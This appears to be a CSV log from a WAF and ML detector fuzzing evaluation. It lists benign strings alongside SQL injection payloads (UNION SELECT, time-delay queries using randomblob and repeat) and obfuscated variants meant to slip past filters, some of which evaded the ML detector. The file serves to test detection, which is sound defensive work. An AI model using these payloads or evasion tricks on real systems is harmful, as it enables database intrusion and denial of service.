Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T22:06:52.522045,calle codigo correspondencia oficial correos-telegrafos 33,200,200,200,both_correct,calle codigo	correspondencia oficial correos-telegrafos/*^*/(sELeCT (SELECT 7782<>7783)),2024-12-16T22:06:55.985556,200,200,both_correct,"calle codigo
correspondencia oficial correos-telegrafos/*^*/(SeLecT/**/(sELECT 0x1e66 NOT LIKE 'oXuib'<>'oXuib&'))",2024-12-16T22:07:01.229069,200,200,both_correct,calle codigo correspondencia oficial correos-telegrafos/**/(seLecT (seleCT 0x1e66 NOT LIKE 'oXuib' NOT LIKE 'oXuib&')),2024-12-16T22:07:07.881395,200,403,waf_correct_ml_incorrect,calle codigo correspondencia oficial correos-telegrafos (SEleCT (SELECT 0x1e66 not like	'oXuib' NOT LIKE 'oXuib&')),2024-12-16T22:07:14.503361,200,200,both_correct,calle codigo/**/correspondencia oficial correos-telegrafos (sELeCt (seLecT 0x1e66 not like	'oXuib' NOT	LIKE 'oXuib&')),2024-12-16T22:07:21.255594,200,200,both_correct
2,2024-12-16T22:07:27.849059,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",403,403,403,both_correct,"(SELECT 9604)!= AND 1' iN boolean mode	 )   union/**/all SElECT null,null,null,null,null,null,null,null,null,null--",2024-12-16T22:07:32.306299,403,403,both_correct,"(sELect 0x2584) not like  And ''},^' NOT LIKE ''},^E'' in boolean mode  )   union all sELecT null,null,null,null,null,null,null,null,null,null--",2024-12-16T22:07:38.772720,403,403,both_correct,"(SelEct 0x2584) not like  anD/**/''},^' NOT LIKE ''},^E'' iN boolean
mode  )   union all SELECT null,null,null,null,null,null,null,null,null,null--",2024-12-16T22:07:46.866580,403,403,both_correct,"(seLeCT 0x2584) not like  aNd ''},^' NOT LIKE ''},^E'' In boolean mode  )   union all SelECT null,null,null,null,null,null,null,null,null,null--",2024-12-16T22:07:54.894312,403,403,both_correct,"(SeleCt 0x2584) not like  aNd ''},^' NOT LIKE ''},^E'' in/*LsNB*/boolean mode  )  	union all seLeCT null,null,null,null,null,null,null,null,null,null--",2024-12-16T22:08:02.771138,403,403,both_correct
3,2024-12-16T22:08:11.266769,"-9240' union all select 6538,6538,6538#",403,403,403,both_correct,"-	ANd 0x1'/**/union all select 6538,6538,'<xF'!='<xFo'#A",2024-12-16T22:08:13.221478,403,403,both_correct,"-	ANd 0x1' union	all select '""V:'!='""V:I',(SELECT (SELECT 1)),'<xF'!='<xFo'#AOQ",2024-12-16T22:08:16.954962,403,403,both_correct,"-	&& 0x1' union	all select '""V:'!='""V:I',(SELECT
(SELECT (SELECT /**/OR '&'!='&j'))),'<xF'!='<xFo'#AOQu)",2024-12-16T22:08:21.767969,403,403,both_correct,"-  AND  0x1' union	all select '""V:'!='""V:I',(SELECT
(SELECT (SELECT /**/OR/**/'&'!='&j'))),'<xF'!='<xFo'#AOQu)yR",2024-12-16T22:08:27.901080,403,403,both_correct,"-/**/ &&  0x1' union	all select '""V:'!='""V:I',(SELECT (SELECT (SELECT /**/OR/**/'&'!='&j'))),'<xF'!='<xFo'#AOQu)yR",2024-12-16T22:08:34.275116,403,403,both_correct
4,2024-12-16T22:08:40.957584,"1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",403,403,200,waf_correct_ml_incorrect,"1'   ) 
  )    aS mdtm wHERE  or 0  =  1393 aND char  (  918=918  )  ||char  (  121  )   or char  (  97  )  ||char  (  80/**/ )    =  regexp_substring  (  repeat  (  LeFT  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,0x1dcd6500  )  ,null  )  --",2024-12-16T22:08:53.873554,403,200,waf_correct_ml_incorrect,"0x1'   ) 
  )    as mdtm WhERE  Or 0  =  1393 and char  (   OR 0=918  )  ||char  (  121  )   OR char  (  97  )  ||char  (  80/**/ )    =  regexp_substring  (  repeat  (  lefT  (
 crypt_key  (  char  (  'ay' NOT LIKE 'ayr'  )   oR char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,0x1dcd6500  )  ,null  )/**/ --",2024-12-16T22:09:08.560886,403,200,waf_correct_ml_incorrect,"0x1'   ) 
  )    as mdtm WhERE  Or 0  =  (SELECT 1393) and char  (   OR 0=(SELECT 1)  )  ||char  (  121  )   OR char  (  '.'='.'  )  ||char  (  80/**/ )    =  regexp_substring  (  repeat /**/(  lefT  (
 crypt_key  (  char  (  'ay' NOT LIKE 'ayr'  )   oR char  (  69  )   oR char  (  83 	)  ,null  )  ,0  )  ,0x1dcd6500  )  ,null  )/**/ --",2024-12-16T22:09:24.138275,403,200,waf_correct_ml_incorrect,"0x1'   ) 
  )    as mdtm WhERE  Or 0  =  (SELECT 1393) and char	 (   OR (SELECT 1)=(SELECT 1)  )  ||char  (  121  )   OR char  (  '.'='.'  )  ||char  (  80  )    =  regexp_substring  (  repeat /**/(  lefT  (
 crypt_key  (  char  (  'ay' NOT LIKE 'ayr'  )   Or char  (  (SELECT 69)  )   oR char  (  7754 NOT LIKE 7755 	)  ,null  )  ,0  )  ,0x1dcd6500  )  ,null  )/**/ --",2024-12-16T22:09:41.213673,403,403,both_correct,"0x1'   ) 
  )    as mdtm WhERE  Or 0  =  (SELECT 1393) and char	 (   OR (SELECT 1)=(SELECT 1)  )  ||char  (  121  )   OR char  (  '.'='.'  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  lefT  (
 crypt_key  (  char  (  'ay' NOT LIKE 'ayr'  )   OR char  (  (selECT 69) 
)   oR char  (  (sElect 7754) not like 7755 	)  ,null  )  ,9433 NOT LIKE (SELECT 1)  )  ,0x1dcd6500  )  ,null  )/*{*/ --",2024-12-16T22:09:59.814790,403,403,both_correct
5,2024-12-16T22:10:19.658415,"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",403,403,200,waf_correct_ml_incorrect," oR 0 In (1320,1321,1322)'   )	   )     )   or 6979  =  like  (  'abcdefg',upper  (  hex/*qL*/ (  randomblob  (  (SeleCt 500000000)/2   )    )      )    )   --",2024-12-16T22:10:25.389475,403,200,waf_correct_ml_incorrect," oR 0x0 iN (1320,1321,1322)'   )	  	)     )   or 6979  =  like  (  'abcdefg',upper  (  hex/*qL*/ (  randomblob  (  (Select 500000000)/ OR 'k' NOT LIKE 'k\'   )    )      )/**/   )   --",2024-12-16T22:10:33.922498,403,200,waf_correct_ml_incorrect," || 0x0 iN (1320,(SELECT 1321),'E<b'!='E<b9')'   )	   )     )   or  OR 0  =  like  (  'abcdefg',upper  (/**/ hex/*qL*/ (  randomblob  (  (Select 500000000)/ OR 'k' NOT LIKE 'k\'   )    )      )/**/   )   --",2024-12-16T22:10:43.748021,403,200,waf_correct_ml_incorrect,"  oR  0x0 in (1320,(sELect 0x529),'E<b'!='E<b9')'   )
   )     )   or  OR 6447!=6448  =  like  (  'abcdefg',upper  (/**/ hex/*qL*/ (  randomblob  (  (Select  AND 1)/ OR 'k' NOT LIKE 'k\' /**/ )    )      )/**/   )   --",2024-12-16T22:10:54.368431,403,200,waf_correct_ml_incorrect,"  or  0x0 IN (1320,(Select 0x529),'E<b' not like 'E<b9')'   )
   )     )   or  OR  AND (SELECT 1)!=6448  =  like  (  'abcdefg',upper
 (/**/ hex/*qL*/ (  randomblob  (  (Select  AND ' 4>' NOT LIKE ' 4>Y')/ OR 'k' NOT LIKE 'k\' /**/ )    )      )    )   --",2024-12-16T22:11:05.816483,403,403,both_correct
6,2024-12-16T22:11:18.848891,5mpe92onal,200,200,200,both_correct,5mpe92onal,2024-12-16T22:11:19.463793,200,200,both_correct,5mpe92onal,2024-12-16T22:11:21.066972,200,200,both_correct,5mpe92onal,2024-12-16T22:11:22.677623,200,200,both_correct,5mpe92onal,2024-12-16T22:11:24.286161,200,200,both_correct,5mpe92onal,2024-12-16T22:11:25.885467,200,200,both_correct
7,2024-12-16T22:11:27.502506,"-5425 where 5933  =  5933 union all select 5933,5933,5933--",403,403,403,both_correct,"- OR 0
WHeRE 5933  = /**/5933 union all selECT 5933,0x172d,'[O:Z' LIKE '[O:Z'--",2024-12-16T22:11:30.404778,403,403,both_correct,"- or 0	WHEre 0x172d  = /*""AO,~*/ Or 2324!=2325 union all seLeCT/**/5933,0x172d,'[O:Z' LiKE '[O:Z'--",2024-12-16T22:11:35.207411,403,403,both_correct,"- oR 998 NOT LIKE 999	WHEre
0x172d   lIke  /*%~v5*/ oR  ANd 0x1!=2325 union all SeLect 5933,0x172d,'[O:Z' lIKe '[O:Z'--",2024-12-16T22:11:41.241706,403,403,both_correct,"- oR 998 NOT LIKE 0x3e7
WheRe
0x172d/**/  LiKE  /*%~v5*/ Or  aNd 0x1<>(SELECT 1) union all selECT 'b' NOT LIKE 'b@',0x172d,'[O:Z' lIkE '[O:Z'--",2024-12-16T22:11:47.904624,403,403,both_correct,"- or 998 not like 0x3e7
wHErE
0x172d  	Like  /**/ or  And 0x1<>(SEleCt (SeLect 1) NOT LIKE 0x149) union all select 'b' NOT LIKE 'b@',0x172d,'[O:Z' like '[O:Z'--",2024-12-16T22:11:55.816070,403,403,both_correct
8,2024-12-16T22:12:04.719063,frades,200,200,200,both_correct,frades,2024-12-16T22:12:05.151895,200,200,both_correct,frades,2024-12-16T22:12:06.571679,200,200,both_correct,frades,2024-12-16T22:12:08.001734,200,200,both_correct,frades,2024-12-16T22:12:09.423959,200,200,both_correct,frades,2024-12-16T22:12:10.850091,200,200,both_correct
9,2024-12-16T22:12:12.256583,"fernandez latorre 14,",200,200,403,waf_correct_ml_incorrect,"fernandez	latorre/**/0xe,",2024-12-16T22:12:13.369449,200,200,both_correct,"fernandez
latorre/**t)O*/0xe,",2024-12-16T22:12:15.685817,200,200,both_correct,"fernandez/**/latorre/**t)O*/0xe,",2024-12-16T22:12:18.293849,200,200,both_correct,"fernandez
latorre/**t)O*/0xe,",2024-12-16T22:12:20.920341,200,200,both_correct,"fernandez latorre/**t)O*/0xe,",2024-12-16T22:12:23.385330,200,200,both_correct
10,2024-12-16T22:12:25.868059,borzani jordan,200,200,200,both_correct,"borzani
jordan",2024-12-16T22:12:26.667303,200,200,both_correct,borzani	jordan,2024-12-16T22:12:28.441425,200,200,both_correct,"borzani
jordan",2024-12-16T22:12:30.233799,200,200,both_correct,borzani/**/jordan,2024-12-16T22:12:32.032010,200,200,both_correct,"borzani
jordan",2024-12-16T22:12:33.975031,200,200,both_correct
